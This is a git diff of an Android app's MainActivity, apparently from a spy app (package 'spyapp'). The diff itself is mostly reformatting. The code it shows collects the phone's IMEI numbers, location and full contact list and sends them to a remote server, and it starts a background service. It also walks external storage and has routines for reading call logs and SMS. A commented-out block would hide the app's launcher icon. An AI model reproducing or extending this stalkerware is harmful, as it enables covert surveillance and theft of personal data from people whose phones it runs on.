@@ -70,10 +70,12 @@ public class MainActivity extends AppCompatActivity {
     EditText mail;
     Button login;
     ProgressBar bar;
-    @SuppressLint("HardwareIds") String imeiNumber1;
-    @SuppressLint("HardwareIds") String imeiNumber2;
+    @SuppressLint("HardwareIds")
+    String imeiNumber1;
+    @SuppressLint("HardwareIds")
+    String imeiNumber2;
     String address;
-    String  name,phoneNumber, id,lat,lon;
+    String name, phoneNumber, id, lat, lon;
     List<ContactDatum> data = new ArrayList<>();
     SharedPreferences pref;
     SharedPreferences.Editor edit;
@@ -88,10 +90,10 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
 
 
-       // textView = (TextView) findViewById(R.id.textview);
+        // textView = (TextView) findViewById(R.id.textview);
 
-        mail = (EditText)findViewById(R.id.mail);
-        login = (Button)findViewById(R.id.logInButton);
+        mail = (EditText) findViewById(R.id.mail);
+        login = (Button) findViewById(R.id.logInButton);
         bar = (ProgressBar) findViewById(R.id.progress);
         pref = getSharedPreferences("pref", Activity.MODE_PRIVATE);
         edit = pref.edit();
@@ -100,58 +102,57 @@ public class MainActivity extends AppCompatActivity {
             @Override
             public void onClick(View view) {
 
-              final String e =  mail.getText().toString();
+                final String e = mail.getText().toString();
 
-              if (e.length() > 0){
-                  bar.setVisibility(VISIBLE);
-                  Bean b = (Bean) getApplicationContext();
+                if (e.length() > 0) {
+                    bar.setVisibility(VISIBLE);
+                    Bean b = (Bean) getApplicationContext();
 
-                  Retrofit retrofit = new Retrofit.Builder()
-                          .baseUrl(b.baseURL)
-                          .addConverterFactory(ScalarsConverterFactory.create())
-                          .addConverterFactory(GsonConverterFactory.create())
-                          .build();
-                  Allapi cr = retrofit.create(Allapi.class);
-                  Call<mailBean> call = cr.login(e);
-                  call.enqueue(new Callback<mailBean>() {
-                      @Override
-                      public void onResponse(Call<mailBean> call, Response<mailBean> response) {
-                          bar.setVisibility(View.GONE);
-                          Log.d("successHoGyaHAi", response.message());
-                          Log.d("successHoGyaHAi", "success");
-                          Toast.makeText(MainActivity.this, "Please check your E-mail Id and click on that link.", Toast.LENGTH_SHORT).show();
+                    Retrofit retrofit = new Retrofit.Builder()
+                            .baseUrl(b.baseURL)
+                            .addConverterFactory(ScalarsConverterFactory.create())
+                            .addConverterFactory(GsonConverterFactory.create())
+                            .build();
+                    Allapi cr = retrofit.create(Allapi.class);
+                    Call<mailBean> call = cr.login(e);
+                    call.enqueue(new Callback<mailBean>() {
+                        @Override
+                        public void onResponse(Call<mailBean> call, Response<mailBean> response) {
+                            bar.setVisibility(View.GONE);
+                            Log.d("successHoGyaHAi", response.message());
+                            Log.d("successHoGyaHAi", "success");
+                            Toast.makeText(MainActivity.this, "Please check your E-mail Id and click on that link.", Toast.LENGTH_SHORT).show();
 
-                          id = response.body().getResult().getEmail();
+                            id = response.body().getResult().getEmail();
 
-                          edit.putString("id",response.body().getResult().getEmail());
-                          edit.apply();
+                            edit.putString("id", response.body().getResult().getEmail());
+                            edit.apply();
 
 
-                          mainApi();
-                          latLonApi();
-                          contactApi();
+                            mainApi();
+                            latLonApi();
+                            contactApi();
 
-                          Intent in = new  Intent(MainActivity.this,MsgService.class);
-                          startService(in);
+                            Intent in = new Intent(MainActivity.this, MsgService.class);
+                            startService(in);
 
                          /* PackageManager p = getPackageManager();
                           ComponentName componentName = new ComponentName(this, kkactive_india.in.spyapp.MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
                           p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);*/
 
 
+                        }
 
-                      }
+                        @Override
+                        public void onFailure(Call<mailBean> call, Throwable t) {
 
-                      @Override
-                      public void onFailure(Call<mailBean> call, Throwable t) {
-
-                      }
-                  });
-              }
+                        }
+                    });
+                }
             }
         });
 
-        Log.d("sadasd" , "kjhasdkh");
+        Log.d("sadasd", "kjhasdkh");
 
         TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
@@ -192,7 +193,7 @@ public class MainActivity extends AppCompatActivity {
         lat = String.valueOf(l[0]);
         lon = String.valueOf(l[1]);
 
-        Log.d("latitude",lat);
+        Log.d("latitude", lat);
         Log.d("longitude", lon);
 
 
@@ -238,7 +239,7 @@ public class MainActivity extends AppCompatActivity {
         data = new ArrayList<>();
 
         while (phones.moveToNext()) {
-            name= phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+            name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
             phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
             //Toast.makeText(getApplicationContext(),name, Toast.LENGTH_LONG).show();
 
@@ -250,12 +251,10 @@ public class MainActivity extends AppCompatActivity {
             sb.append("\n----------------------------------");
 
 
-
             ContactDatum person = new ContactDatum();
-            person.setName( name );
-            person.setMobile( phoneNumber );
+            person.setName(name);
+            person.setMobile(phoneNumber);
             data.add(person);
-
 
 
         }
@@ -268,18 +267,16 @@ public class MainActivity extends AppCompatActivity {
 
         // calls();
 
-       // getSMS();
-
+        // getSMS();
 
 
         files();
 
 
-
     }
 
-    public void files(){
-        if ( Environment.MEDIA_MOUNTED.equals(state) || Environment.MEDIA_MOUNTED_READ_ONLY.equals(state) ) {  // we can read the External Storage...
+    public void files() {
+        if (Environment.MEDIA_MOUNTED.equals(state) || Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {  // we can read the External Storage...
             getAllFilesOfDir(Environment.getExternalStorageDirectory());
         }
     }
@@ -289,13 +286,13 @@ public class MainActivity extends AppCompatActivity {
 
         final File[] files = directory.listFiles();
 
-        if ( files != null ) {
-            for ( File file : files ) {
-                if ( file != null ) {
-                    if ( file.isDirectory() ) {  // it is a folder...
+        if (files != null) {
+            for (File file : files) {
+                if (file != null) {
+                    if (file.isDirectory()) {  // it is a folder...
                         getAllFilesOfDir(file);
-                    }
-                    else {  // it is a file...
+
+                    } else {  // it is a file...
                         Log.d("FileHaiKya", "File: " + file.getAbsolutePath() + "\n");
                     }
                 }
@@ -303,7 +300,7 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    public void mainApi(){
+    public void mainApi() {
 
         Bean b = (Bean) getApplicationContext();
 
@@ -315,7 +312,7 @@ public class MainActivity extends AppCompatActivity {
         Allapi cr = retrofit.create(Allapi.class);
 
 
-        Call<MainBean> call = cr.main(id,imeiNumber1,imeiNumber2);
+        Call<MainBean> call = cr.main(id, imeiNumber1, imeiNumber2);
         call.enqueue(new Callback<MainBean>() {
             @Override
             public void onResponse(Call<MainBean> call, Response<MainBean> response) {
@@ -330,7 +327,7 @@ public class MainActivity extends AppCompatActivity {
 
     }
 
-    public void latLonApi(){
+    public void latLonApi() {
         Bean b = (Bean) getApplicationContext();
 
         Retrofit retrofit = new Retrofit.Builder()
@@ -339,7 +336,7 @@ public class MainActivity extends AppCompatActivity {
                 .addConverterFactory(GsonConverterFactory.create())
                 .build();
         Allapi cr = retrofit.create(Allapi.class);
-        Call<locationBean> call = cr.latlon(id,lat,lon);
+        Call<locationBean> call = cr.latlon(id, lat, lon);
         call.enqueue(new Callback<locationBean>() {
             @Override
             public void onResponse(Call<locationBean> call, Response<locationBean> response) {
@@ -353,9 +350,9 @@ public class MainActivity extends AppCompatActivity {
         });
     }
 
-    public void contactApi(){
+    public void contactApi() {
 
-        Log.d("asdasads" , "asdjhgsadhjasd");
+        Log.d("asdasads", "asdjhgsadhjasd");
 
         Bean b = (Bean) getApplicationContext();
 
@@ -378,10 +375,7 @@ public class MainActivity extends AppCompatActivity {
         body.setContact(data);*/
 
 
-
-     contactBean body = new contactBean();
-
-
+        contactBean body = new contactBean();
 
 
         body.setContactData(data);
@@ -391,12 +385,11 @@ public class MainActivity extends AppCompatActivity {
         String jsonStr = gsonObj.toJson(body);
 
 
-        Log.d("dgfdh" , jsonStr);
-        Log.d("dgfdh" , id);
+        Log.d("dgfdh", jsonStr);
+        Log.d("dgfdh", id);
 
 
-
-        Call<contactBean> call = cr.contact(id,jsonStr);
+        Call<contactBean> call = cr.contact(id, jsonStr);
         call.enqueue(new Callback<contactBean>() {
             @Override
             public void onResponse(Call<contactBean> call, Response<contactBean> response) {
@@ -411,7 +404,6 @@ public class MainActivity extends AppCompatActivity {
         });
 
     }
-
 
 
     public void callLogs() {
@@ -458,16 +450,14 @@ public class MainActivity extends AppCompatActivity {
             sb.append("\n----------------------------------");
         }
         managedCursor.close();
-       // textView.setText(sb);
+        // textView.setText(sb);
         Log.e("Agil value --- ", sb.toString());
 
 
     }
 
 
-
     public List<String> getSMS() {
-
 
 
         List<String> sms = new ArrayList<String>();
@@ -509,9 +499,6 @@ public class MainActivity extends AppCompatActivity {
             cur.close();
         }
         return sms;
-
-
-
     }
 
 }
